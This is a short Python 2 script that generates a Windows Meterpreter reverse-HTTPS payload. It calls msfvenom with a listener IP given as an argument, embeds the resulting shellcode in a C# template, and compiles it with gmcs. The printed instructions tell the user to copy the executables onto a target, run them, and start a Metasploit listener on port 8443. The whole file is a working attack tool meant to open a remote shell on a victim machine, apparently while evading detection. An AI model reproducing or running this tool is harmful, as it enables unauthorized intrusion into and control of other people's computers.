import os
import sys
if len(sys.argv)<=1:
	print "Enter listener IP address to generate payload"
	exit(0)
if not os.path.isfile("runcode.exe"):
	print "generating runcode.exe"
	os.system('gmcs -unsafe -out:runcode.exe runcode.cs')
print "generating msf payload"
os.system('msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=' + sys.argv[1]+' LPORT=8443  -f csharp > tmpf.txt')
os.system('sed \'1d\' tmpf.txt > tmpfile; mv tmpfile tmpf.txt')
os.system('sed -i \'$s/..$//\' tmpf.txt ')
shellcodehandle=open('tmpf.txt','r')
shellstring=shellcodehandle.read()
texthandle=open('textgen.cs','r')
templatestring=texthandle.read()
templatestring=templatestring%shellstring
textgen=open("payload1.cs","w")
textgen.write(templatestring)
textgen.close()
os.system('gmcs -unsafe -out:payload1.exe payload1.cs')
os.system('mono payload1.exe')
print ('copy runcode.exe and test1.txt into the target and run '
       'runcode.exe;setup msf listener for ' 
        'windows/x64/meterpreter/reverse_https on port 8443')